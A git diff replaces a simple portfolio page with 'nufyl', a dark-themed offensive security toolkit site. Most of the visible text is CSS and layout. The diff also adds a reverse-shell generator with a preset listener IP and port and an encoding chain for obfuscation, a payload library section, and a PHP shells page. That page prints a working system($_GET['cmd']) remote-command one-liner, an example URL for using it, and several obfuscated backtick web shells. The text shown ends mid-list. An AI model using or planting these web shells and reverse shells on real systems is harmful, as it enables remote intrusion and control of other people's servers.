@@ -1,111 +1,1904 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portfolio | Your Name</title>
-    <style>
-        :root {
-            --accent-red: #a00000;
-            --bg-gray: #f4f4f4;
-        }
-        body {
-            font-family: Georgia, serif;
-            line-height: 1.6;
-            margin: 0;
-            background-color: white;
-            color: #333;
-        }
-        header {
-            border-top: 10px solid #2d3e2d; /* Dark green top bar */
-            padding: 20px 10% 0 10%;
-        }
-        .site-title {
-            font-family: Arial, sans-serif;
-            font-size: 2.5rem;
-            font-weight: bold;
-            margin-bottom: 10px;
-        }
-        nav {
-            background: black;
-            padding: 5px 10%;
-        }
-        nav a {
-            color: white;
-            text-decoration: none;
-            font-family: Arial, sans-serif;
-            font-size: 0.9rem;
-            margin-right: 20px;
-            text-transform: capitalize;
-        }
-        .container {
-            display: grid;
-            grid-template-columns: 1fr 300px;
-            gap: 40px;
-            padding: 20px 10%;
-        }
-        main h2 {
-            color: var(--accent-red);
-            font-family: Arial, sans-serif;
-            border-bottom: 1px solid #ddd;
-        }
-        .sidebar {
-            font-family: Arial, sans-serif;
-            font-size: 0.85rem;
-        }
-        .sidebar-box {
-            border: 1px solid #ccc;
-            margin-bottom: 20px;
-        }
-        .sidebar-header {
-            background: var(--accent-red);
-            color: white;
-            padding: 5px 10px;
-            font-weight: bold;
-        }
-        .sidebar-content {
-            padding: 10px;
-            background: #f9f9f9;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>nufyl — offensive security</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#08080a;--bg2:#0f0f13;--bg3:#15151a;--bg4:#1c1c24;
+  --border:#1a1a24;--border2:#252534;--border3:#32324a;
+  --text:#dcdcf0;--muted:#52526e;--dim:#2e2e42;
+  --accent:#e8431a;--accent-dim:rgba(232,67,26,0.12);
+  --green:#2dd4a0;--blue:#5ba4f5;--purple:#a78bfa;
+  --yellow:#f5c542;--red:#f06060;--orange:#f0904a;
+  --mono:'JetBrains Mono',monospace;--sans:'Syne',sans-serif;
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{background:var(--bg);color:var(--text);font-family:var(--mono);font-size:13px;line-height:1.6;min-height:100vh;overflow-x:hidden;}
+::-webkit-scrollbar{width:3px;height:3px;}
+::-webkit-scrollbar-track{background:var(--bg);}
+::-webkit-scrollbar-thumb{background:var(--border3);}
+button,input,select,textarea{font-family:var(--mono);}
+.page{display:none;}
+.page.active{display:block;animation:pIn .18s ease;}
+@keyframes pIn{from{opacity:0;transform:translateY(5px);}to{opacity:1;transform:translateY(0);}}
+
+/* ─── NAV ─── */
+#nav{
+  position:fixed;top:0;left:0;right:0;z-index:500;
+  height:48px;display:flex;align-items:center;padding:0 1.5rem;gap:6px;
+  background:rgba(8,8,10,.92);backdrop-filter:blur(14px);
+  border-bottom:1px solid var(--border);
+}
+.n-brand{font-family:var(--sans);font-size:16px;font-weight:800;cursor:pointer;color:var(--text);letter-spacing:-.5px;margin-right:12px;}
+.n-brand em{color:var(--accent);font-style:normal;}
+.n-link{
+  padding:4px 9px;font-size:11px;color:var(--muted);cursor:pointer;
+  border-radius:4px;transition:all .14s;border:none;background:none;
+  display:flex;align-items:center;gap:5px;white-space:nowrap;
+}
+.n-link:hover{color:var(--text);background:var(--bg3);}
+.n-link.on{color:var(--accent);}
+.n-link .ni{font-size:12px;}
+.n-sep{width:1px;height:14px;background:var(--border2);flex-shrink:0;}
+
+/* ─── HERO ─── */
+.hero{
+  min-height:100vh;display:flex;flex-direction:column;
+  align-items:center;justify-content:center;
+  padding:80px 2rem 4rem;position:relative;overflow:hidden;
+}
+.h-grid{
+  position:absolute;inset:0;pointer-events:none;
+  background-image:linear-gradient(var(--border) 1px,transparent 1px),linear-gradient(90deg,var(--border) 1px,transparent 1px);
+  background-size:52px 52px;opacity:.5;
+  mask-image:radial-gradient(ellipse 75% 65% at 50% 50%,black,transparent);
+}
+.h-glow{position:absolute;width:700px;height:350px;background:radial-gradient(ellipse,rgba(232,67,26,.06) 0%,transparent 65%);top:50%;left:50%;transform:translate(-50%,-50%);pointer-events:none;}
+.h-kicker{font-size:10px;letter-spacing:.2em;text-transform:uppercase;color:var(--accent);margin-bottom:1.4rem;display:flex;align-items:center;gap:10px;position:relative;}
+.h-kicker::before,.h-kicker::after{content:'';display:block;width:24px;height:1px;background:var(--accent);opacity:.5;}
+.h-title{font-family:var(--sans);font-size:clamp(3rem,8vw,7rem);font-weight:800;line-height:.9;text-align:center;letter-spacing:-4px;margin-bottom:1.4rem;position:relative;}
+.h-title .ghost{color:transparent;-webkit-text-stroke:1.5px var(--accent);}
+.h-sub{font-size:12px;color:var(--muted);text-align:center;max-width:400px;margin-bottom:3rem;line-height:1.9;position:relative;}
+.h-prompt{
+  font-size:11px;color:var(--green);background:var(--bg2);
+  border:1px solid var(--border2);border-radius:6px;
+  padding:9px 18px;margin-bottom:3rem;position:relative;letter-spacing:.04em;
+}
+.h-prompt .cur{display:inline-block;width:7px;height:12px;background:var(--green);margin-left:3px;vertical-align:middle;animation:blink 1.1s step-end infinite;}
+@keyframes blink{0%,100%{opacity:1;}50%{opacity:0;}}
+
+.tool-grid{
+  display:grid;grid-template-columns:repeat(auto-fill,minmax(230px,1fr));
+  gap:1px;background:var(--border);border:1px solid var(--border);
+  border-radius:10px;overflow:hidden;width:100%;max-width:1080px;position:relative;
+}
+.t-card{
+  background:var(--bg2);padding:1.4rem 1.4rem 1.2rem;
+  cursor:pointer;transition:background .15s;position:relative;overflow:hidden;
+}
+.t-card:hover{background:var(--bg3);}
+.t-card-icon{font-size:22px;margin-bottom:.7rem;display:block;}
+.t-card-name{font-family:var(--sans);font-size:13px;font-weight:700;margin-bottom:3px;}
+.t-card-desc{font-size:11px;color:var(--muted);line-height:1.55;}
+.t-arr{position:absolute;right:1.2rem;top:1.4rem;color:var(--dim);font-size:13px;transition:all .2s;}
+.t-card:hover .t-arr{right:.9rem;color:var(--accent);}
+.t-tag{display:inline-block;font-size:10px;padding:2px 7px;border-radius:3px;margin-top:7px;background:var(--accent-dim);color:var(--accent);border:1px solid rgba(232,67,26,.2);}
+
+/* ─── SUBPAGE SHELL ─── */
+.sp{padding-top:48px;min-height:100vh;}
+.sp-hdr{padding:2.2rem 2rem 1.8rem;border-bottom:1px solid var(--border);max-width:940px;margin:0 auto;}
+.sp-badge{font-size:10px;letter-spacing:.14em;text-transform:uppercase;color:var(--accent);margin-bottom:.5rem;}
+.sp-title{font-family:var(--sans);font-size:clamp(1.6rem,3.5vw,2.4rem);font-weight:800;letter-spacing:-1.5px;line-height:1;margin-bottom:.5rem;}
+.sp-desc{font-size:11px;color:var(--muted);max-width:500px;line-height:1.8;}
+.sp-body{max-width:940px;margin:0 auto;padding:2rem;}
+
+/* ─── SECTION ─── */
+.sec{margin-bottom:2.5rem;}
+.sec-hdr{display:flex;align-items:center;gap:8px;margin-bottom:1rem;padding-bottom:.6rem;border-bottom:1px solid var(--border);}
+.sec-icon{font-size:13px;}
+.sec-lbl{font-family:var(--sans);font-size:12px;font-weight:700;color:var(--text);}
+.sec-note{font-size:10px;color:var(--muted);margin-left:auto;}
+
+/* ─── CONTROLS ─── */
+.controls{
+  display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));
+  gap:10px;background:var(--bg2);border:1px solid var(--border);
+  border-radius:9px;padding:1rem;margin-bottom:1rem;
+}
+.ctrl label{display:block;font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:.08em;margin-bottom:4px;}
+.ctrl select,.ctrl input[type=text]{
+  width:100%;background:var(--bg3);border:1px solid var(--border2);
+  color:var(--text);font-size:12px;border-radius:5px;padding:7px 9px;outline:none;
+  transition:border-color .15s;
+}
+.ctrl select:focus,.ctrl input:focus{border-color:var(--accent);}
+
+/* ─── CODE BLOCK ─── */
+.cb{background:var(--bg2);border:1px solid var(--border);border-radius:7px;overflow:hidden;margin-bottom:6px;}
+.cb-hdr{display:flex;align-items:center;justify-content:space-between;padding:7px 12px;border-bottom:1px solid var(--border);background:var(--bg3);}
+.cb-lang{font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:.08em;display:flex;align-items:center;gap:6px;}
+.cb-lang::before{content:'';display:block;width:6px;height:6px;border-radius:50%;background:var(--accent);}
+.cb-btns{display:flex;gap:5px;}
+.cpbtn{font-size:10px;padding:3px 9px;background:transparent;border:1px solid var(--border2);color:var(--muted);border-radius:4px;cursor:pointer;transition:all .14s;}
+.cpbtn:hover{border-color:var(--accent);color:var(--accent);}
+.cpbtn.ok{border-color:var(--green);color:var(--green);}
+.cb pre{padding:.9rem 1rem;overflow-x:auto;font-size:11.5px;line-height:1.75;color:#9090b0;white-space:pre-wrap;word-break:break-all;}
+
+/* ─── BUTTONS ─── */
+.act{display:flex;gap:7px;flex-wrap:wrap;margin-top:10px;}
+.btn{font-size:11px;padding:7px 15px;border-radius:5px;cursor:pointer;transition:all .14s;border:1px solid var(--border2);background:transparent;color:var(--muted);}
+.btn:hover{color:var(--text);border-color:var(--border3);}
+.btn.prime{background:var(--accent);color:#fff;border-color:var(--accent);}
+.btn.prime:hover{background:#cc3614;}
+.btn.ok{background:rgba(45,212,160,.08);color:var(--green);border-color:rgba(45,212,160,.25);}
+
+/* ─── ENC CHIPS ─── */
+.ec-row{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:1rem;}
+.ec{font-size:11px;padding:4px 11px;border-radius:20px;border:1px solid var(--border2);background:transparent;color:var(--muted);cursor:pointer;transition:all .14s;}
+.ec:hover{color:var(--text);}
+.ec.on{background:rgba(232,67,26,.1);border-color:var(--accent);color:var(--accent);}
+
+/* ─── FILTER CHIPS ─── */
+.fc-row{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:1.2rem;}
+.fc{font-size:11px;padding:4px 11px;border-radius:4px;border:1px solid var(--border);background:transparent;color:var(--muted);cursor:pointer;transition:all .14s;}
+.fc:hover{color:var(--text);border-color:var(--border2);}
+.fc.on{background:var(--accent-dim);border-color:rgba(232,67,26,.35);color:var(--accent);}
+
+/* ─── SEARCH ─── */
+.s-wrap{position:relative;margin-bottom:1rem;}
+.s-wrap input{
+  width:100%;background:var(--bg2);border:1px solid var(--border);
+  color:var(--text);font-size:12px;border-radius:7px;
+  padding:9px 12px 9px 32px;outline:none;
+}
+.s-wrap input:focus{border-color:var(--border2);}
+.s-wrap::before{content:'⌕';position:absolute;left:10px;top:50%;transform:translateY(-50%);color:var(--muted);font-size:15px;pointer-events:none;}
+
+/* ─── PAYLOAD CARDS ─── */
+.p-grid{display:grid;gap:7px;}
+.p-card{background:var(--bg2);border:1px solid var(--border);border-radius:7px;overflow:hidden;transition:border-color .14s;}
+.p-card:hover{border-color:var(--border2);}
+.p-top{display:flex;align-items:center;justify-content:space-between;padding:8px 12px;border-bottom:1px solid var(--border);}
+.p-name{font-size:12px;font-weight:500;color:var(--text);}
+.p-tags{display:flex;gap:4px;}
+.pt{font-size:10px;padding:1px 6px;border-radius:3px;}
+.pt-web{background:rgba(91,164,245,.1);color:var(--blue);}
+.pt-win{background:rgba(45,212,160,.1);color:var(--green);}
+.pt-lin{background:rgba(245,197,66,.1);color:var(--yellow);}
+.pt-blind{background:rgba(167,139,250,.1);color:var(--purple);}
+.pt-oob{background:rgba(240,144,74,.1);color:var(--orange);}
+.p-code{padding:8px 12px;font-size:11px;color:#7070a0;background:var(--bg3);word-break:break-all;line-height:1.65;}
+.p-foot{padding:6px 12px;display:flex;justify-content:space-between;align-items:center;}
+.p-desc{font-size:10px;color:var(--muted);}
+
+/* ─── TTY STEPS ─── */
+.tty-steps{display:grid;gap:9px;}
+.tty-s{display:grid;grid-template-columns:26px 1fr;gap:10px;align-items:start;}
+.tty-n{width:24px;height:24px;border-radius:50%;background:rgba(232,67,26,.1);border:1px solid rgba(232,67,26,.3);display:flex;align-items:center;justify-content:center;font-size:10px;color:var(--accent);font-weight:600;flex-shrink:0;margin-top:2px;}
+.tty-title{font-size:12px;font-weight:500;color:var(--text);margin-bottom:3px;}
+.tty-note{font-size:11px;color:var(--muted);margin-bottom:5px;line-height:1.6;}
+
+/* ─── CMD LIST ─── */
+.cmd-list{display:grid;gap:5px;}
+.cmd-item{background:var(--bg2);border:1px solid var(--border);border-radius:5px;padding:8px 12px;}
+.cmd-lbl{font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:2px;}
+.cmd-val{font-size:11.5px;color:#7070a0;word-break:break-all;}
+
+/* ─── SECTION TABS ─── */
+.tab-nav{display:flex;gap:1px;background:var(--border);border-radius:6px;overflow:hidden;width:fit-content;margin-bottom:1.5rem;}
+.tb{padding:6px 13px;font-size:11px;background:var(--bg3);color:var(--muted);cursor:pointer;border:none;transition:all .14s;}
+.tb.on{background:var(--bg2);color:var(--text);}
+.tpane{display:none;}
+.tpane.on{display:block;}
+
+/* ─── MSF ─── */
+.msf-tabs{display:flex;gap:1px;background:var(--border);border-radius:6px 6px 0 0;overflow:hidden;}
+.mt{flex:1;padding:7px 10px;font-size:11px;background:var(--bg3);color:var(--muted);cursor:pointer;border:none;text-align:center;transition:all .14s;}
+.mt.on{background:var(--bg2);color:var(--text);}
+.msf-out{border:1px solid var(--border);border-top:none;border-radius:0 0 6px 6px;overflow:hidden;}
+
+/* ─── ENCODING PAGE ─── */
+.enc-io{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:1rem;}
+.enc-box{display:grid;gap:5px;}
+.enc-box label{font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:.08em;}
+.enc-box textarea{
+  width:100%;min-height:120px;background:var(--bg2);border:1px solid var(--border);
+  color:var(--text);font-size:12px;border-radius:6px;padding:10px;
+  outline:none;resize:vertical;line-height:1.6;
+}
+.enc-box textarea:focus{border-color:var(--border2);}
+.enc-btns{display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:1rem;}
+.enc-btn{font-size:11px;padding:6px 13px;border-radius:5px;border:1px solid var(--border2);background:transparent;color:var(--muted);cursor:pointer;transition:all .14s;}
+.enc-btn:hover{color:var(--text);border-color:var(--border3);}
+.enc-btn.enc-do{background:var(--accent);color:#fff;border-color:var(--accent);}
+.enc-btn.enc-do:hover{background:#cc3614;}
+.enc-group{margin-bottom:1.5rem;}
+.enc-group-title{font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:.1em;margin-bottom:.6rem;display:flex;align-items:center;gap:8px;}
+.enc-group-title::after{content:'';flex:1;height:1px;background:var(--border);}
+.enc-ops{display:flex;gap:6px;flex-wrap:wrap;}
+.enc-op{font-size:11px;padding:5px 12px;border-radius:4px;border:1px solid var(--border);background:transparent;color:var(--muted);cursor:pointer;transition:all .14s;}
+.enc-op:hover{color:var(--text);border-color:var(--border2);}
+.enc-op.active{background:var(--accent-dim);border-color:rgba(232,67,26,.35);color:var(--accent);}
+
+/* ─── HASH CRACKER ─── */
+.hash-wrap{display:grid;gap:10px;margin-bottom:1.5rem;}
+.hash-row{display:grid;grid-template-columns:1fr auto auto;gap:8px;align-items:center;}
+.hash-input{
+  background:var(--bg2);border:1px solid var(--border);color:var(--text);
+  font-size:12px;border-radius:5px;padding:8px 10px;outline:none;
+  transition:border-color .15s;
+}
+.hash-input:focus{border-color:var(--accent);}
+.hash-result{
+  font-size:11px;padding:5px 10px;border-radius:4px;
+  border:1px solid var(--border);background:var(--bg3);color:var(--muted);
+  white-space:nowrap;min-width:120px;text-align:center;
+}
+.hash-result.found{border-color:rgba(45,212,160,.3);color:var(--green);background:rgba(45,212,160,.06);}
+.hash-result.notfound{border-color:rgba(240,96,96,.3);color:var(--red);background:rgba(240,96,96,.06);}
+.hash-bulk{width:100%;min-height:100px;background:var(--bg2);border:1px solid var(--border);color:var(--text);font-size:12px;border-radius:6px;padding:10px;outline:none;resize:vertical;line-height:1.7;}
+.hash-bulk:focus{border-color:var(--border2);}
+.hash-results-table{width:100%;border-collapse:collapse;font-size:12px;}
+.hash-results-table th{text-align:left;padding:7px 10px;font-size:10px;text-transform:uppercase;letter-spacing:.08em;color:var(--muted);border-bottom:1px solid var(--border);background:var(--bg3);}
+.hash-results-table td{padding:7px 10px;border-bottom:1px solid var(--border);word-break:break-all;}
+.hash-results-table tr:last-child td{border-bottom:none;}
+.crack-loading{font-size:11px;color:var(--muted);padding:8px 0;display:none;}
+.crack-loading.show{display:block;}
+
+/* ─── ADMIN ─── */
+.admin-login{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:2rem;padding-top:48px;}
+.al-card{background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:2.2rem;width:100%;max-width:340px;}
+.al-logo{font-family:var(--sans);font-size:17px;font-weight:800;margin-bottom:.2rem;}
+.al-logo em{color:var(--accent);font-style:normal;}
+.al-sub{font-size:11px;color:var(--muted);margin-bottom:1.8rem;}
+.al-f{margin-bottom:.9rem;}
+.al-f label{display:block;font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:.08em;margin-bottom:4px;}
+.al-f input{width:100%;background:var(--bg3);border:1px solid var(--border2);color:var(--text);font-size:13px;border-radius:5px;padding:9px 11px;outline:none;}
+.al-f input:focus{border-color:var(--accent);}
+.al-btn{width:100%;padding:10px;background:var(--accent);color:#fff;border:none;border-radius:5px;font-family:var(--sans);font-size:14px;font-weight:700;cursor:pointer;}
+.al-btn:hover{background:#cc3614;}
+.al-err{font-size:11px;color:var(--red);margin-top:7px;display:none;}
+
+.admin-wrap{padding-top:48px;display:grid;grid-template-columns:190px 1fr;min-height:calc(100vh - 48px);}
+.adm-sb{background:var(--bg2);border-right:1px solid var(--border);padding:.8rem 0;display:flex;flex-direction:column;}
+.adm-sb-ttl{font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:.1em;padding:0 1rem .5rem;}
+.adm-nav{padding:7px 1rem;font-size:11px;color:var(--muted);cursor:pointer;display:flex;align-items:center;gap:7px;transition:all .14s;border-right:2px solid transparent;}
+.adm-nav:hover{color:var(--text);background:rgba(255,255,255,.02);}
+.adm-nav.on{color:var(--accent);border-right-color:var(--accent);background:rgba(232,67,26,.04);}
+.adm-main{padding:2rem;overflow-y:auto;background:var(--bg);}
+.adm-s{display:none;}
+.adm-s.on{display:block;}
+.adm-ttl{font-family:var(--sans);font-size:16px;font-weight:700;margin-bottom:1.5rem;letter-spacing:-.5px;}
+.ef{margin-bottom:1.1rem;}
+.ef label{display:block;font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:.08em;margin-bottom:4px;}
+.ef input,.ef textarea,.ef select{
+  width:100%;background:var(--bg2);border:1px solid var(--border2);
+  color:var(--text);font-size:12px;border-radius:5px;padding:8px 10px;
+  outline:none;resize:vertical;
+}
+.ef input:focus,.ef textarea:focus{border-color:var(--accent);}
+.ef textarea{min-height:90px;line-height:1.6;}
+.sv-btn{padding:7px 16px;background:var(--accent);color:#fff;border:none;border-radius:5px;font-size:11px;cursor:pointer;}
+.sv-btn:hover{background:#cc3614;}
+.sv-flash{font-size:11px;color:var(--green);margin-left:8px;opacity:0;transition:opacity .3s;display:inline-block;}
+.sv-flash.show{opacity:1;}
+.icon-grid{display:flex;flex-wrap:wrap;gap:5px;padding:8px;background:var(--bg2);border:1px solid var(--border2);border-radius:5px;max-height:110px;overflow-y:auto;}
+.ic-o{font-size:17px;cursor:pointer;padding:3px 5px;border-radius:3px;border:1px solid transparent;transition:all .14s;}
+.ic-o:hover{background:var(--border);}
+.ic-o.sel{border-color:var(--accent);background:var(--accent-dim);}
+.ple-list{display:grid;gap:8px;}
+.ple-item{background:var(--bg2);border:1px solid var(--border);border-radius:7px;padding:1rem;}
+.ple-item .ef{margin-bottom:.65rem;}
+.del-btn{padding:3px 9px;background:transparent;border:1px solid rgba(240,96,96,.3);color:var(--red);border-radius:4px;font-size:10px;cursor:pointer;}
+.del-btn:hover{background:rgba(240,96,96,.08);}
+.add-btn{padding:6px 13px;background:transparent;border:1px solid var(--border2);color:var(--muted);border-radius:5px;font-size:11px;cursor:pointer;transition:all .14s;margin-top:6px;}
+.add-btn:hover{color:var(--text);border-color:var(--border3);}
+.logout-btn{margin-top:auto;margin:1rem 1rem 0;padding:6px 10px;font-size:10px;background:transparent;border:1px solid var(--border2);color:var(--muted);border-radius:4px;cursor:pointer;transition:all .14s;}
+.logout-btn:hover{color:var(--red);border-color:rgba(240,96,96,.3);}
+.api-key-note{font-size:10px;color:var(--muted);margin-top:4px;line-height:1.6;}
+</style>
 </head>
 <body>
 
-<header>
-    <div class="site-title">Your Name on Tech</div>
-</header>
-
-<nav>
-    <a href="index.html">Portfolio</a>
-    <a href="#">Projects</a>
-    <a href="#">CV</a>
-    <a href="editor.html">Admin</a>
+<!-- NAV -->
+<nav id="nav">
+  <div class="n-brand" onclick="go('home')">nufyl<em>.</em></div>
+  <div id="nav-links" style="display:flex;gap:2px;align-items:center;overflow-x:auto;">
+    <button class="n-link" onclick="go('shells')" data-p="shells"><span class="ni" id="ni-shells">🐚</span> shells</button>
+    <button class="n-link" onclick="go('payloads')" data-p="payloads"><span class="ni" id="ni-payloads">💉</span> payloads</button>
+    <button class="n-link" onclick="go('php')" data-p="php"><span class="ni" id="ni-php">🐘</span> php</button>
+    <button class="n-link" onclick="go('lfi')" data-p="lfi"><span class="ni" id="ni-lfi">📁</span> lfi</button>
+    <button class="n-link" onclick="go('xss')" data-p="xss"><span class="ni" id="ni-xss">⚡</span> xss</button>
+    <button class="n-link" onclick="go('sqli')" data-p="sqli"><span class="ni" id="ni-sqli">🗄️</span> sqli</button>
+    <button class="n-link" onclick="go('linux')" data-p="linux"><span class="ni" id="ni-linux">🐧</span> linux</button>
+    <button class="n-link" onclick="go('windows')" data-p="windows"><span class="ni" id="ni-windows">🪟</span> windows</button>
+    <div class="n-sep"></div>
+    <button class="n-link" onclick="go('encoding')" data-p="encoding"><span class="ni" id="ni-encoding">🔐</span> encoding</button>
+    <button class="n-link" onclick="go('msf')" data-p="msf"><span class="ni" id="ni-msf">💀</span> msfvenom</button>
+    <button class="n-link" onclick="go('tty')" data-p="tty"><span class="ni" id="ni-tty">🖥️</span> tty</button>
+  </div>
 </nav>
 
-<div class="container">
-    <main>
-        <h2>Recent Work & Analysis</h2>
-        <article>
-            <p><strong>March 26, 2026</strong></p>
-            <p>This is where your primary content goes. To match the Schneier style, use bolded lead-ins and simple, unstyled links.</p>
-        </article>
-    </main>
-
-    <aside class="sidebar">
-        <div class="sidebar-box">
-            <div class="sidebar-header">Search</div>
-            <div class="sidebar-content">
-                <input type="text" style="width:70%"> <button>Go</button>
-            </div>
-        </div>
-        <div class="sidebar-box">
-            <div class="sidebar-header">About Me</div>
-            <div class="sidebar-content">
-                <p>Public-interest technologist and developer.</p>
-            </div>
-        </div>
-    </aside>
+<!-- ======== HOME ======== -->
+<div id="page-home" class="page active">
+  <div class="hero">
+    <div class="h-grid"></div>
+    <div class="h-glow"></div>
+    <div class="h-kicker">offensive security toolkit</div>
+    <h1 class="h-title">nu<span class="ghost">fyl</span></h1>
+    <p class="h-sub" id="home-desc">Reverse shells, payloads, exploitation references and live tooling — built for pentesters.</p>
+    <div class="h-prompt">root@nufyl:~$ select --tool<span class="cur"></span></div>
+    <div class="tool-grid" id="tool-grid"></div>
+  </div>
 </div>
 
+<!-- ======== SHELLS ======== -->
+<div id="page-shells" class="page">
+  <div class="sp">
+    <div class="sp-hdr">
+      <div class="sp-badge">reverse shells</div>
+      <h1 class="sp-title" id="shells-title">Shell Generator</h1>
+      <p class="sp-desc" id="shells-desc">One-liner reverse shells across 20+ languages. Set your LHOST/LPORT and chain encodings.</p>
+    </div>
+    <div class="sp-body">
+      <div class="sec">
+        <div class="sec-hdr"><span class="sec-icon">⚙️</span><span class="sec-lbl">configuration</span></div>
+        <div class="controls">
+          <div class="ctrl">
+            <label>Shell type</label>
+            <select id="shell-type" onchange="genShell()">
+              <option value="bash">Bash</option>
+              <option value="bash2">Bash (alt)</option>
+              <option value="zsh">Zsh</option>
+              <option value="python3">Python 3</option>
+              <option value="python2">Python 2</option>
+              <option value="nc">Netcat (mkfifo)</option>
+              <option value="nce">Netcat (-e)</option>
+              <option value="ncat">Ncat</option>
+              <option value="telnet">Telnet</option>
+              <option value="powershell">PowerShell</option>
+              <option value="psb64">PowerShell (b64)</option>
+              <option value="perl">Perl</option>
+              <option value="ruby">Ruby</option>
+              <option value="php">PHP</option>
+              <option value="phpproc">PHP (proc_open)</option>
+              <option value="lua">Lua</option>
+              <option value="golang">Go</option>
+              <option value="awk">AWK</option>
+              <option value="java">Java</option>
+              <option value="socat">Socat</option>
+              <option value="socat-tty">Socat (TTY)</option>
+              <option value="nodejs">Node.js</option>
+            </select>
+          </div>
+          <div class="ctrl">
+            <label>LHOST</label>
+            <input type="text" id="lhost" value="192.168.49.57" oninput="genShell()">
+          </div>
+          <div class="ctrl">
+            <label>LPORT</label>
+            <input type="text" id="lport" value="54" oninput="genShell()">
+          </div>
+        </div>
+      </div>
+      <div class="sec">
+        <div class="sec-hdr"><span class="sec-icon">🔗</span><span class="sec-lbl">encoding chain</span><span class="sec-note">chainable — applied in order</span></div>
+        <div class="ec-row">
+          <button class="ec" data-e="b64" onclick="toggleEnc(this)">base64</button>
+          <button class="ec" data-e="url" onclick="toggleEnc(this)">url encode</button>
+          <button class="ec" data-e="durl" onclick="toggleEnc(this)">double url</button>
+          <button class="ec" data-e="hex" onclick="toggleEnc(this)">hex (%XX)</button>
+          <button class="ec" data-e="unicode" onclick="toggleEnc(this)">unicode (\uXXXX)</button>
+          <button class="ec" data-e="html" onclick="toggleEnc(this)">html entities</button>
+        </div>
+      </div>
+      <div class="sec">
+        <div class="sec-hdr"><span class="sec-icon">📤</span><span class="sec-lbl">generated payload</span></div>
+        <div class="cb">
+          <div class="cb-hdr">
+            <span class="cb-lang" id="shell-lang-lbl">bash</span>
+            <div class="cb-btns">
+              <button class="cpbtn" onclick="copyShell()">copy</button>
+            </div>
+          </div>
+          <pre id="shell-out">loading...</pre>
+        </div>
+        <div class="act">
+          <button class="btn prime" onclick="copyShell()">copy payload</button>
+          <button class="btn" onclick="genShell()">regenerate</button>
+        </div>
+      </div>
+      <div class="sec">
+        <div class="sec-hdr"><span class="sec-icon">👂</span><span class="sec-lbl">listener commands</span></div>
+        <div class="cmd-list" id="listener-cmds"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ======== PAYLOADS ======== -->
+<div id="page-payloads" class="page">
+  <div class="sp">
+    <div class="sp-hdr">
+      <div class="sp-badge">payload library</div>
+      <h1 class="sp-title" id="payloads-title">Payload Library</h1>
+      <p class="sp-desc" id="payloads-desc">Curated exploitation payloads across web attack categories. Filter, search, copy.</p>
+    </div>
+    <div class="sp-body">
+      <div class="s-wrap"><input type="text" id="payload-search" placeholder="search payloads..." oninput="renderPayloads()"></div>
+      <div class="fc-row" id="payload-filters"></div>
+      <div class="p-grid" id="payload-grid"></div>
+    </div>
+  </div>
+</div>
+
+<!-- ======== PHP ======== -->
+<div id="page-php" class="page">
+  <div class="sp">
+    <div class="sp-hdr">
+      <div class="sp-badge">php shells</div>
+      <h1 class="sp-title" id="php-title">PHP Shells</h1>
+      <p class="sp-desc" id="php-desc">PHP reverse shells, web shells, and obfuscated one-liners for post-upload exploitation.</p>
+    </div>
+    <div class="sp-body">
+      <div class="sec">
+        <div class="sec-hdr"><span class="sec-icon">🐘</span><span class="sec-lbl">pentestmonkey reverse shell</span></div>
+        <p style="font-size:11px;color:var(--muted);margin-bottom:.75rem;line-height:1.7;">Full-featured PHP reverse shell by pentestmonkey. Edit <code style="color:var(--accent);">$ip</code> and <code style="color:var(--accent);">$port</code> before uploading.</p>
+        <div class="controls" style="grid-template-columns:1fr 1fr;">
+          <div class="ctrl"><label>IP</label><input type="text" id="php-ip" value="192.168.49.57" oninput="genPhpShell()"></div>
+          <div class="ctrl"><label>Port</label><input type="text" id="php-port" value="54" oninput="genPhpShell()"></div>
+        </div>
+        <div class="cb">
+          <div class="cb-hdr"><span class="cb-lang">php</span><button class="cpbtn" onclick="copyById('php-full-out')">copy</button></div>
+          <pre id="php-full-out"></pre>
+        </div>
+      </div>
+      <div class="sec">
+        <div class="sec-hdr"><span class="sec-icon">⚡</span><span class="sec-lbl">basic rce one-liner</span></div>
+        <div class="cb">
+          <div class="cb-hdr"><span class="cb-lang">php</span><button class="cpbtn" onclick="copyById('php-rce')">copy</button></div>
+          <pre id="php-rce">&lt;?php system($_GET["cmd"]);?&gt;</pre>
+        </div>
+        <p style="font-size:11px;color:var(--muted);margin-top:6px;">Usage: <code style="color:var(--blue);">http://target.com/shell.php?cmd=id</code></p>
+      </div>
+      <div class="sec">
+        <div class="sec-hdr"><span class="sec-icon">🕵️</span><span class="sec-lbl">obfuscated web shells</span></div>
+        <div class="cmd-list">
+          <div class="cmd-item"><div class="cmd-lbl">short GET</div><div class="cmd-val">&lt;?=`$_GET[0]`?&gt;</div></div>
+          <div class="cmd-item"><div class="cmd-lbl">short POST</div><div class="cmd-val">&lt;?=`$_POST[0]`?&gt;</div></div>
+          <div class="cmd-item"><div class="cmd-lbl">request var</div><div class="cmd-val">&lt;?=`{$_REQUEST['_']}`?&gt;</div></div>
